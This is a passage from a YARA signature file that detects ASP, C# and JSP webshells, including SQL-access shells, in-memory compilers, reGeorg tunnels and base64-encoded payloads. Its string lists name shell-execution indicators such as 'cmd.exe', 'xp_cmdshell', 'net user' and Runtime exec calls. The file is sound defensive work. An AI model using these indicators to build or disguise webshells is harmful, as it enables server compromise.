// <%@ WebService Language="C#" Class="Service" %>
// <%@Page Language="Jscript"%>
// <%@ Page Language = Jscript %>
// <%@PAGE LANGUAGE=JSCRIPT%>
// <%@ Page Language="Jscript" validateRequest="false" %>
// <%@ Page Language = Jscript %>
// <%@ Page Language="C#" %>
// <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
// <script runat="server" language="JScript">
// <SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
// <SCRIPT  RUNAT=SERVER  LANGUAGE=JSCRIPT>
// <msxsl:script language="JScript" ...
$tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii
$tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
$tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii
// avoid hitting php
$php1 = "<?php"
$php2 = "<?="
// avoid hitting jsp
$jsp1 = "=\"java." wide ascii
$jsp2 = "=\"javax." wide ascii
$jsp3 = "java.lang." wide ascii
$jsp4 = "public" fullword wide ascii
$jsp5 = "throws" fullword wide ascii
$jsp6 = "getValue" fullword wide ascii
$jsp7 = "getBytes" fullword wide ascii
$perl1 = "PerlScript" fullword
condition:
filesize < 300KB and (
(
any of ( $tagasp_long* ) or
// TODO :  yara_push_private_rules.py doesn't do private rules in private rules yet
any of ( $tagasp_classid* ) or
(
$tagasp_short1 and
$tagasp_short2 in ( filesize-100..filesize )
) or (
$tagasp_short2 and (
$tagasp_short1 in ( 0..1000 ) or
$tagasp_short1 in ( filesize-1000..filesize )
)
)
) and not (
(
any of ( $perl* ) or
$php1 at 0 or
$php2 at 0
) or (
( #jsp1 + #jsp2 + #jsp3 ) > 0 and ( #jsp4 + #jsp5 + #jsp6 + #jsp7 ) > 0
)
)
)
and
( $georg or
( all of ( $sa* ) and any of ( $input_sa* ) ) )
}
rule SSC_Swebshell_csharp_generic
{
meta:
description = "Webshell in c#"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
hash = "b6721683aadc4b4eba4f081f2bc6bc57adfc0e378f6d80e2bfa0b1e3e57c85c7"
date = "2021/01/11"
strings:
$input_http = "Request." nocase wide ascii
$input_form1 = "<asp:" nocase wide ascii
$input_form2 = ".text" nocase wide ascii
$exec_proc1 = "new Process" nocase wide ascii
$exec_proc2 = "start(" nocase wide ascii
$exec_shell1 = "cmd.exe" nocase wide ascii
$exec_shell2 = "powershell.exe" nocase wide ascii
//strings from private rule capa_asp
$tagasp_short1 = /<%[^"]/ wide ascii
// also looking for %> to reduce fp (yeah, short atom but seldom since special chars)
$tagasp_short2 = "%>" wide ascii
// classids for scripting host etc
$tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
$tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
$tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
$tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
$tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
$tagasp_long10 = "<%@ " wide ascii
// <% eval
$tagasp_long11 = /<% \w/ nocase wide ascii
$tagasp_long12 = "<%ex" nocase wide ascii
$tagasp_long13 = "<%ev" nocase wide ascii
// <%@ LANGUAGE = VBScript.encode%>
// <%@ Language = "JScript" %>
// <%@ WebHandler Language="C#" class="Handler" %>
// <%@ WebService Language="C#" Class="Service" %>
// <%@Page Language="Jscript"%>
// <%@ Page Language = Jscript %>
// <%@PAGE LANGUAGE=JSCRIPT%>
// <%@ Page Language="Jscript" validateRequest="false" %>
// <%@ Page Language = Jscript %>
// <%@ Page Language="C#" %>
// <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
// <script runat="server" language="JScript">
// <SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
// <SCRIPT  RUNAT=SERVER  LANGUAGE=JSCRIPT>
// <msxsl:script language="JScript" ...
$tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii
$tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
$tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii
// avoid hitting php
$php1 = "<?php"
$php2 = "<?="
// avoid hitting jsp
$jsp1 = "=\"java." wide ascii
$jsp2 = "=\"javax." wide ascii
$jsp3 = "java.lang." wide ascii
$jsp4 = "public" fullword wide ascii
$jsp5 = "throws" fullword wide ascii
$jsp6 = "getValue" fullword wide ascii
$jsp7 = "getBytes" fullword wide ascii
$perl1 = "PerlScript" fullword
condition:
(
(
any of ( $tagasp_long* ) or
// TODO :  yara_push_private_rules.py doesn't do private rules in private rules yet
any of ( $tagasp_classid* ) or
(
$tagasp_short1 and
$tagasp_short2 in ( filesize-100..filesize )
) or (
$tagasp_short2 and (
$tagasp_short1 in ( 0..1000 ) or
$tagasp_short1 in ( filesize-1000..filesize )
)
)
) and not (
(
any of ( $perl* ) or
$php1 at 0 or
$php2 at 0
) or (
( #jsp1 + #jsp2 + #jsp3 ) > 0 and ( #jsp4 + #jsp5 + #jsp6 + #jsp7 ) > 0
)
)
)
and filesize < 300KB and
( $input_http or all of ( $input_form* ) ) and all of ( $exec_proc* ) and any of ( $exec_shell* )
}
rule SSC_Swebshell_asp_runtime_compile : FILE {
meta:
description = "ASP webshell compiling payload in memory at runtime, e.g. sharpyshell"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
reference = "https://github.com/antonioCoco/SharPyShell"
date = "2021/01/11"
hash = "e826c4139282818d38dcccd35c7ae6857b1d1d01"
hash = "e20e078d9fcbb209e3733a06ad21847c5c5f0e52"
hash = "57f758137aa3a125e4af809789f3681d1b08ee5b"
strings:
$payload_reflection1 = "System.Reflection" nocase wide ascii
$payload_reflection2 = "Assembly" fullword nocase wide ascii
$payload_load_reflection1 = /[."']Load\b/ nocase wide ascii
// only match on "load" or variable which might contain "load"
$payload_load_reflection2 = /\bGetMethod\(("load|\w)/ nocase wide ascii
$payload_compile1 = "GenerateInMemory" nocase wide ascii
$payload_compile2 = "CompileAssemblyFromSource" nocase wide ascii
$payload_invoke1 = "Invoke" fullword nocase wide ascii
$payload_invoke2 = "CreateInstance" fullword nocase wide ascii
$rc_fp1 = "Request.MapPath"
$rc_fp2 = "<body><mono:MonoSamplesHeader runat=\"server\"/>" wide ascii
//strings from private rule capa_asp_input
// Request.BinaryRead
// Request.Form
$asp_input1 = "request" fullword nocase wide ascii
$asp_input2 = "Page_Load" fullword nocase wide ascii
// base64 of Request.Form(
$asp_input3 = "UmVxdWVzdC5Gb3JtK" fullword wide ascii
$asp_xml_http = "Microsoft.XMLHTTP" fullword nocase wide ascii
$asp_xml_method1 = "GET" fullword wide ascii
$asp_xml_method2 = "POST" fullword wide ascii
$asp_xml_method3 = "HEAD" fullword wide ascii
// dynamic form
$asp_form1 = "<form " wide ascii
$asp_form2 = "<Form " wide ascii
$asp_form3 = "<FORM " wide ascii
$asp_asp   = "<asp:" wide ascii
$asp_text1 = ".text" wide ascii
$asp_text2 = ".Text" wide ascii
condition:
filesize < 10KB and (
any of ( $asp_input* ) or
(
$asp_xml_http and
any of ( $asp_xml_method* )
) or
(
any of ( $asp_form* ) and
any of ( $asp_text* ) and
$asp_asp
)
)
and not any of ( $rc_fp* ) and
( ( all of ( $payload_reflection* ) and any of ( $payload_load_reflection* ) ) or all of ( $payload_compile* ) ) and any of ( $payload_invoke* )
}
rule SSC_Swebshell_asp_sql
{
meta:
description = "ASP webshell giving SQL access. Might also be a dual use tool."
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
date = "2021/03/14"
strings:
$sql1 = "SqlConnection" fullword wide ascii
$sql2 = "SQLConnection" fullword wide ascii
$sql3 = "System" fullword wide ascii
$sql4 = "Data" fullword wide ascii
$sql5 = "SqlClient" fullword wide ascii
$sql6 = "SQLClient" fullword wide ascii
$sql7 = "Open" fullword wide ascii
$sql8 = "SqlCommand" fullword wide ascii
$sql9 = "SQLCommand" fullword wide ascii
$o_sql1 = "SQLOLEDB" fullword wide ascii
$o_sql2 = "CreateObject" fullword wide ascii
$o_sql3 = "open" fullword wide ascii
$a_sql1 = "ADODB.Connection" fullword wide ascii
$a_sql2 = "adodb.connection" fullword wide ascii
$a_sql3 = "CreateObject" fullword wide ascii
$a_sql4 = "createobject" fullword wide ascii
$a_sql5 = "open" fullword wide ascii
$c_sql1 = "System.Data.SqlClient" fullword wide ascii
$c_sql2 = "sqlConnection" fullword wide ascii
$c_sql3 = "open" fullword wide ascii
$sus1 = "shell" fullword nocase wide ascii
$sus2 = "xp_cmdshell" fullword nocase wide ascii
$sus3 = "aspxspy" fullword nocase wide ascii
$sus4 = "_KillMe" wide ascii
$sus5 = "cmd.exe" fullword wide ascii
$sus6 = "cmd /c" fullword wide ascii
$sus7 = "net user" fullword wide ascii
$sus8 = "\\x2D\\x3E\\x7C" wide ascii
$sus9 = "Hacker" fullword wide ascii
$sus10 = "hacker" fullword wide ascii
$sus11 = "HACKER" fullword wide ascii
$sus12 = "webshell" wide ascii
$sus13 = "equest[\"sql\"]" wide ascii
$sus14 = "equest(\"sql\")" wide ascii
$sus15 = { e5 bc 80 e5 a7 8b e5 af bc e5 }
$sus16 = "\"sqlCommand\"" wide ascii
$sus17 = "\"sqlcommand\"" wide ascii
//$slightly_sus1 = "select * from " wide ascii
//$slightly_sus2 = "SELECT * FROM " wide ascii
$slightly_sus3 = "SHOW COLUMNS FROM " wide ascii
$slightly_sus4 = "show columns from " wide ascii
//strings from private rule capa_asp
$tagasp_short1 = /<%[^"]/ wide ascii
// also looking for %> to reduce fp (yeah, short atom but seldom since special chars)
$tagasp_short2 = "%>" wide ascii
// classids for scripting host etc
$tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
$tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
$tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
$tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
$tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
$tagasp_long10 = "<%@ " wide ascii
// <% eval
$tagasp_long11 = /<% \w/ nocase wide ascii
$tagasp_long12 = "<%ex" nocase wide ascii
$tagasp_long13 = "<%ev" nocase wide ascii
// <%@ LANGUAGE = VBScript.encode%>
// <%@ Language = "JScript" %>
// <%@ WebHandler Language="C#" class="Handler" %>
// <%@ WebService Language="C#" Class="Service" %>
// <%@Page Language="Jscript"%>
// <%@ Page Language = Jscript %>
// <%@PAGE LANGUAGE=JSCRIPT%>
// <%@ Page Language="Jscript" validateRequest="false" %>
// <%@ Page Language = Jscript %>
// <%@ Page Language="C#" %>
// <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
// <script runat="server" language="JScript">
// <SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
// <SCRIPT  RUNAT=SERVER  LANGUAGE=JSCRIPT>
// <msxsl:script language="JScript" ...
$tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii
$tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
$tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii
// avoid hitting php
$php1 = "<?php"
$php2 = "<?="
// avoid hitting jsp
$jsp1 = "=\"java." wide ascii
$jsp2 = "=\"javax." wide ascii
$jsp3 = "java.lang." wide ascii
$jsp4 = "public" fullword wide ascii
$jsp5 = "throws" fullword wide ascii
$jsp6 = "getValue" fullword wide ascii
$jsp7 = "getBytes" fullword wide ascii
$perl1 = "PerlScript" fullword
//strings from private rule capa_asp_input
// Request.BinaryRead
// Request.Form
$asp_input1 = "request" fullword nocase wide ascii
$asp_input2 = "Page_Load" fullword nocase wide ascii
// base64 of Request.Form(
$asp_input3 = "UmVxdWVzdC5Gb3JtK" fullword wide ascii
$asp_xml_http = "Microsoft.XMLHTTP" fullword nocase wide ascii
$asp_xml_method1 = "GET" fullword wide ascii
$asp_xml_method2 = "POST" fullword wide ascii
$asp_xml_method3 = "HEAD" fullword wide ascii
// dynamic form
$asp_form1 = "<form " wide ascii
$asp_form2 = "<Form " wide ascii
$asp_form3 = "<FORM " wide ascii
$asp_asp   = "<asp:" wide ascii
$asp_text1 = ".text" wide ascii
$asp_text2 = ".Text" wide ascii
condition:
(
(
any of ( $tagasp_long* ) or
// TODO :  yara_push_private_rules.py doesn't do private rules in private rules yet
any of ( $tagasp_classid* ) or
(
$tagasp_short1 and
$tagasp_short2 in ( filesize-100..filesize )
) or (
$tagasp_short2 and (
$tagasp_short1 in ( 0..1000 ) or
$tagasp_short1 in ( filesize-1000..filesize )
)
)
) and not (
(
any of ( $perl* ) or
$php1 at 0 or
$php2 at 0
) or (
( #jsp1 + #jsp2 + #jsp3 ) > 0 and ( #jsp4 + #jsp5 + #jsp6 + #jsp7 ) > 0
)
)
)
and (
any of ( $asp_input* ) or
(
$asp_xml_http and
any of ( $asp_xml_method* )
) or
(
any of ( $asp_form* ) and
any of ( $asp_text* ) and
$asp_asp
)
)
and
( 6 of ( $sql* ) or all of ( $o_sql* ) or 3 of ( $a_sql* ) or all of ( $c_sql* ) ) and
( ( filesize < 150KB and any of ( $sus* ) ) or
( filesize < 5KB and any of ( $slightly_sus* ) ) )
}
rule SSC_Swebshell_asp_scan_writable
{
meta:
description = "ASP webshell searching for writable directories (to hide more webshells ...)"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
date = "2021/03/14"
hash = "2409eda9047085baf12e0f1b9d0b357672f7a152"
hash = "af1c00696243f8b062a53dad9fb8b773fa1f0395631ffe6c7decc42c47eedee7"
strings:
$scan1 = "DirectoryInfo" nocase fullword wide ascii
$scan2 = "GetDirectories" nocase fullword wide ascii
$scan3 = "Create" nocase fullword wide ascii
$scan4 = "File" nocase fullword wide ascii
$scan5 = "System.IO" nocase fullword wide ascii
// two methods: check permissions or write and delete:
$scan6 = "CanWrite" nocase fullword wide ascii
$scan7 = "Delete" nocase fullword wide ascii
$sus1 = "upload" nocase fullword wide ascii
$sus2 = "shell" nocase wide ascii
$sus3 = "orking directory" nocase fullword wide ascii
$sus4 = "scan" nocase wide ascii
//strings from private rule capa_asp
$tagasp_short1 = /<%[^"]/ wide ascii
// also looking for %> to reduce fp (yeah, short atom but seldom since special chars)
$tagasp_short2 = "%>" wide ascii
// classids for scripting host etc
$tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
$tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
$tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
$tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
$tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
$tagasp_long10 = "<%@ " wide ascii
// <% eval
$tagasp_long11 = /<% \w/ nocase wide ascii
$tagasp_long12 = "<%ex" nocase wide ascii
$tagasp_long13 = "<%ev" nocase wide ascii
// <%@ LANGUAGE = VBScript.encode%>
// <%@ Language = "JScript" %>
// <%@ WebHandler Language="C#" class="Handler" %>
// <%@ WebService Language="C#" Class="Service" %>
// <%@Page Language="Jscript"%>
// <%@ Page Language = Jscript %>
// <%@PAGE LANGUAGE=JSCRIPT%>
// <%@ Page Language="Jscript" validateRequest="false" %>
// <%@ Page Language = Jscript %>
// <%@ Page Language="C#" %>
// <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
// <script runat="server" language="JScript">
// <SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
// <SCRIPT  RUNAT=SERVER  LANGUAGE=JSCRIPT>
// <msxsl:script language="JScript" ...
$tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii
$tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
$tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii
// avoid hitting php
$php1 = "<?php"
$php2 = "<?="
// avoid hitting jsp
$jsp1 = "=\"java." wide ascii
$jsp2 = "=\"javax." wide ascii
$jsp3 = "java.lang." wide ascii
$jsp4 = "public" fullword wide ascii
$jsp5 = "throws" fullword wide ascii
$jsp6 = "getValue" fullword wide ascii
$jsp7 = "getBytes" fullword wide ascii
$perl1 = "PerlScript" fullword
//strings from private rule capa_asp_input
// Request.BinaryRead
// Request.Form
$asp_input1 = "request" fullword nocase wide ascii
$asp_input2 = "Page_Load" fullword nocase wide ascii
// base64 of Request.Form(
$asp_input3 = "UmVxdWVzdC5Gb3JtK" fullword wide ascii
$asp_xml_http = "Microsoft.XMLHTTP" fullword nocase wide ascii
$asp_xml_method1 = "GET" fullword wide ascii
$asp_xml_method2 = "POST" fullword wide ascii
$asp_xml_method3 = "HEAD" fullword wide ascii
// dynamic form
$asp_form1 = "<form " wide ascii
$asp_form2 = "<Form " wide ascii
$asp_form3 = "<FORM " wide ascii
$asp_asp   = "<asp:" wide ascii
$asp_text1 = ".text" wide ascii
$asp_text2 = ".Text" wide ascii
condition:
filesize < 10KB and (
(
any of ( $tagasp_long* ) or
// TODO :  yara_push_private_rules.py doesn't do private rules in private rules yet
any of ( $tagasp_classid* ) or
(
$tagasp_short1 and
$tagasp_short2 in ( filesize-100..filesize )
) or (
$tagasp_short2 and (
$tagasp_short1 in ( 0..1000 ) or
$tagasp_short1 in ( filesize-1000..filesize )
)
)
) and not (
(
any of ( $perl* ) or
$php1 at 0 or
$php2 at 0
) or (
( #jsp1 + #jsp2 + #jsp3 ) > 0 and ( #jsp4 + #jsp5 + #jsp6 + #jsp7 ) > 0
)
)
)
and (
any of ( $asp_input* ) or
(
$asp_xml_http and
any of ( $asp_xml_method* )
) or
(
any of ( $asp_form* ) and
any of ( $asp_text* ) and
$asp_asp
)
)
and 6 of ( $scan* ) and any of ( $sus* )
}
rule SSC_Swebshell_jsp_regeorg
{
meta:
description = "Webshell regeorg JSP version"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
reference = "https://github.com/sensepost/reGeorg"
hash = "6db49e43722080b5cd5f07e058a073ba5248b584"
author = "Arnim Rupp"
date = "2021/01/24"
strings:
$jgeorg1 = "request" fullword wide ascii
$jgeorg2 = "getHeader" fullword wide ascii
$jgeorg3 = "X-CMD" fullword wide ascii
$jgeorg4 = "X-STATUS" fullword wide ascii
$jgeorg5 = "socket" fullword wide ascii
$jgeorg6 = "FORWARD" fullword wide ascii
//strings from private rule capa_jsp_safe
$cjsp_short1 = "<%" ascii wide
$cjsp_short2 = "%>" wide ascii
$cjsp_long1 = "<jsp:" ascii wide
$cjsp_long2 = /language=[\"']java[\"\']/ ascii wide
// JSF
$cjsp_long3 = "/jstl/core" ascii wide
$cjsp_long4 = "<%@p" nocase ascii wide
$cjsp_long5 = "<%@ " nocase ascii wide
$cjsp_long6 = "<% " ascii wide
$cjsp_long7 = "< %" ascii wide
condition:
filesize < 300KB and (
$cjsp_short1 at 0 or
any of ( $cjsp_long* ) or
$cjsp_short2 in ( filesize-100..filesize ) or
(
$cjsp_short2 and (
$cjsp_short1 in ( 0..1000 ) or
$cjsp_short1 in ( filesize-1000..filesize )
)
)
)
and all of ( $jgeorg* )
}
rule SSC_Swebshell_jsp_http_proxy
{
meta:
description = "Webshell JSP HTTP proxy"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
hash = "2f9b647660923c5262636a5344e2665512a947a4"
author = "Arnim Rupp"
date = "2021/01/24"
strings:
$jh1 = "OutputStream" fullword wide ascii
$jh2 = "InputStream"  wide ascii
$jh3 = "BufferedReader" fullword wide ascii
$jh4 = "HttpRequest" fullword wide ascii
$jh5 = "openConnection" fullword wide ascii
$jh6 = "getParameter" fullword wide ascii
//strings from private rule capa_jsp_safe
$cjsp_short1 = "<%" ascii wide
$cjsp_short2 = "%>" wide ascii
$cjsp_long1 = "<jsp:" ascii wide
$cjsp_long2 = /language=[\"']java[\"\']/ ascii wide
// JSF
$cjsp_long3 = "/jstl/core" ascii wide
$cjsp_long4 = "<%@p" nocase ascii wide
$cjsp_long5 = "<%@ " nocase ascii wide
$cjsp_long6 = "<% " ascii wide
$cjsp_long7 = "< %" ascii wide
condition:
filesize < 10KB and (
$cjsp_short1 at 0 or
any of ( $cjsp_long* ) or
$cjsp_short2 in ( filesize-100..filesize ) or
(
$cjsp_short2 and (
$cjsp_short1 in ( 0..1000 ) or
$cjsp_short1 in ( filesize-1000..filesize )
)
)
)
and all of ( $jh* )
}
rule SSC_Swebshell_jsp_writer_nano
{
meta:
description = "JSP file writer"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
date = "2021/01/24"
hash = "ac91e5b9b9dcd373eaa9360a51aa661481ab9429"
hash = "c718c885b5d6e29161ee8ea0acadb6e53c556513"
strings:
$payload1 = ".write" wide ascii
$payload2 = "getBytes" fullword wide ascii
//strings from private rule capa_jsp_input
// request.getParameter
$input1 = "getParameter" fullword ascii wide
// request.getHeaders
$input2 = "getHeaders" fullword ascii wide
$input3 = "getInputStream" fullword ascii wide
$input4 = "getReader" fullword ascii wide
$req1 = "request" fullword ascii wide
$req2 = "HttpServletRequest" fullword ascii wide
$req3 = "getRequest" fullword ascii wide
//strings from private rule capa_jsp_safe
$cjsp_short1 = "<%" ascii wide
$cjsp_short2 = "%>" wide ascii
$cjsp_long1 = "<jsp:" ascii wide
$cjsp_long2 = /language=[\"']java[\"\']/ ascii wide
// JSF
$cjsp_long3 = "/jstl/core" ascii wide
$cjsp_long4 = "<%@p" nocase ascii wide
$cjsp_long5 = "<%@ " nocase ascii wide
$cjsp_long6 = "<% " ascii wide
$cjsp_long7 = "< %" ascii wide
condition:
filesize < 200 and (
any of ( $input* ) and
any of ( $req* )
)
and (
$cjsp_short1 at 0 or
any of ( $cjsp_long* ) or
$cjsp_short2 in ( filesize-100..filesize ) or
(
$cjsp_short2 and (
$cjsp_short1 in ( 0..1000 ) or
$cjsp_short1 in ( filesize-1000..filesize )
)
)
)
and 2 of ( $payload* )
}
rule SSC_Swebshell_jsp_generic_tiny
{
meta:
description = "Generic JSP webshell tiny"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
date = "2021/01/07"
hash = "8fd343db0442136e693e745d7af1018a99b042af"
strings:
$payload1 = "ProcessBuilder" fullword wide ascii
$payload2 = "URLClassLoader" fullword wide ascii
// Runtime.getRuntime().exec(
$payload_rt1 = "Runtime" fullword wide ascii
$payload_rt2 = "getRuntime" fullword wide ascii
$payload_rt3 = "exec" fullword wide ascii
//strings from private rule capa_jsp_safe
$cjsp_short1 = "<%" ascii wide
$cjsp_short2 = "%>" wide ascii
$cjsp_long1 = "<jsp:" ascii wide
$cjsp_long2 = /language=[\"']java[\"\']/ ascii wide
// JSF
$cjsp_long3 = "/jstl/core" ascii wide
$cjsp_long4 = "<%@p" nocase ascii wide
$cjsp_long5 = "<%@ " nocase ascii wide
$cjsp_long6 = "<% " ascii wide
$cjsp_long7 = "< %" ascii wide
//strings from private rule capa_jsp_input
// request.getParameter
$input1 = "getParameter" fullword ascii wide
// request.getHeaders
$input2 = "getHeaders" fullword ascii wide
$input3 = "getInputStream" fullword ascii wide
$input4 = "getReader" fullword ascii wide
$req1 = "request" fullword ascii wide
$req2 = "HttpServletRequest" fullword ascii wide
$req3 = "getRequest" fullword ascii wide
condition:
filesize < 250 and (
$cjsp_short1 at 0 or
any of ( $cjsp_long* ) or
$cjsp_short2 in ( filesize-100..filesize ) or
(
$cjsp_short2 and (
$cjsp_short1 in ( 0..1000 ) or
$cjsp_short1 in ( filesize-1000..filesize )
)
)
)
and (
any of ( $input* ) and
any of ( $req* )
)
and
( 1 of ( $payload* ) or all of ( $payload_rt* ) )
}
rule SSC_Swebshell_jsp_generic
{
meta:
description = "Generic JSP webshell"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
date = "2021/01/07"
hash = "4762f36ca01fb9cda2ab559623d2206f401fc0b1"
hash = "bdaf9279b3d9e07e955d0ce706d9c42e4bdf9aa1"
hash = "ee9408eb923f2d16f606a5aaac7e16b009797a07"
strings:
$susp0 = "cmd" fullword nocase ascii wide
$susp1 = "command" fullword nocase ascii wide
$susp2 = "shell" fullword nocase ascii wide
$susp3 = "download" fullword nocase ascii wide
$susp4 = "upload" fullword nocase ascii wide
$susp5 = "Execute" fullword nocase ascii wide
$susp6 = "\"pwd\"" ascii wide
$susp7 = "\"</pre>" ascii wide
$fp1 = "command = \"cmd.exe /c set\";"
//strings from private rule capa_bin_files
$dex   = { 64 65 ( 78 | 79 ) 0a 30 }
$pack  = { 50 41 43 4b 00 00 00 02 00 }
//strings from private rule capa_jsp_safe
$cjsp_short1 = "<%" ascii wide
$cjsp_short2 = "%>" wide ascii
$cjsp_long1 = "<jsp:" ascii wide
$cjsp_long2 = /language=[\"']java[\"\']/ ascii wide
// JSF
$cjsp_long3 = "/jstl/core" ascii wide
$cjsp_long4 = "<%@p" nocase ascii wide
$cjsp_long5 = "<%@ " nocase ascii wide
$cjsp_long6 = "<% " ascii wide
$cjsp_long7 = "< %" ascii wide
//strings from private rule capa_jsp_input
// request.getParameter
$input1 = "getParameter" fullword ascii wide
// request.getHeaders
$input2 = "getHeaders" fullword ascii wide
$input3 = "getInputStream" fullword ascii wide
$input4 = "getReader" fullword ascii wide
$req1 = "request" fullword ascii wide
$req2 = "HttpServletRequest" fullword ascii wide
$req3 = "getRequest" fullword ascii wide
//strings from private rule capa_jsp_payload
$payload1 = "ProcessBuilder" fullword ascii wide
$payload2 = "processCmd" fullword ascii wide
// Runtime.getRuntime().exec(
$rt_payload1 = "Runtime" fullword ascii wide
$rt_payload2 = "getRuntime" fullword ascii wide
$rt_payload3 = "exec" fullword ascii wide
condition:
filesize < 300KB and not (
uint16(0) == 0x5a4d or
$dex at 0 or
$pack at 0 or
// fp on jar with zero compression
uint16(0) == 0x4b50
)
and (
$cjsp_short1 at 0 or
any of ( $cjsp_long* ) or
$cjsp_short2 in ( filesize-100..filesize ) or
(
$cjsp_short2 and (
$cjsp_short1 in ( 0..1000 ) or
$cjsp_short1 in ( filesize-1000..filesize )
)
)
)
and (
any of ( $input* ) and
any of ( $req* )
)
and (
1 of ( $payload* ) or
all of ( $rt_payload* )
)
and not any of ( $fp* ) and any of ( $susp* )
}
rule SSC_Swebshell_jsp_generic_base64
{
meta:
description = "Generic JSP webshell with base64 encoded payload"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
date = "2021/01/24"
hash = "8b5fe53f8833df3657ae2eeafb4fd101c05f0db0"
hash = "1b916afdd415dfa4e77cecf47321fd676ba2184d"
strings:
// Runtime
$one1 = "SdW50aW1l" wide ascii
$one2 = "J1bnRpbW" wide ascii
$one3 = "UnVudGltZ" wide ascii
$one4 = "IAdQBuAHQAaQBtAGUA" wide ascii
$one5 = "SAHUAbgB0AGkAbQBlA" wide ascii
$one6 = "UgB1AG4AdABpAG0AZQ" wide ascii
// exec
$two1 = "leGVj" wide ascii
$two2 = "V4ZW" wide ascii
$two3 = "ZXhlY" wide ascii
$two4 = "UAeABlAGMA" wide ascii
$two5 = "lAHgAZQBjA" wide ascii
$two6 = "ZQB4AGUAYw" wide ascii
// ScriptEngineFactory
$three1 = "TY3JpcHRFbmdpbmVGYWN0b3J5" wide ascii
$three2 = "NjcmlwdEVuZ2luZUZhY3Rvcn" wide ascii
$three3 = "U2NyaXB0RW5naW5lRmFjdG9ye" wide ascii
$three4 = "MAYwByAGkAcAB0AEUAbgBnAGkAbgBlAEYAYQBjAHQAbwByAHkA" wide ascii
$three5 = "TAGMAcgBpAHAAdABFAG4AZwBpAG4AZQBGAGEAYwB0AG8AcgB5A" wide ascii
$three6 = "UwBjAHIAaQBwAHQARQBuAGcAaQBuAGUARgBhAGMAdABvAHIAeQ" wide ascii
//strings from private rule capa_jsp_safe
$cjsp_short1 = "<%" ascii wide
$cjsp_short2 = "%>" wide ascii
$cjsp_long1 = "<jsp:" ascii wide
$cjsp_long2 = /language=[\"']java[\"\']/ ascii wide
// JSF
$cjsp_long3 = "/jstl/core" ascii wide
$cjsp_long4 = "<%@p" nocase ascii wide
$cjsp_long5 = "<%@ " nocase ascii wide
$cjsp_long6 = "<% " ascii wide
$cjsp_long7 = "< %" ascii wide
//strings from private rule capa_bin_files
$dex   = { 64 65 ( 78 | 79 ) 0a 30 }
$pack  = { 50 41 43 4b 00 00 00 02 00 }
condition:
(
$cjsp_short1 at 0 or
any of ( $cjsp_long* ) or
$cjsp_short2 in ( filesize-100..filesize ) or
(
$cjsp_short2 and (
$cjsp_short1 in ( 0..1000 ) or
$cjsp_short1 in ( filesize-1000..filesize )
)
)
)
and not (
uint16(0) == 0x5a4d or
$dex at 0 or
$pack at 0 or
// fp on jar with zero compression
uint16(0) == 0x4b50
)
and filesize < 300KB and
( any of ( $one* ) and any of ( $two* ) or any of ( $three* ) )
}
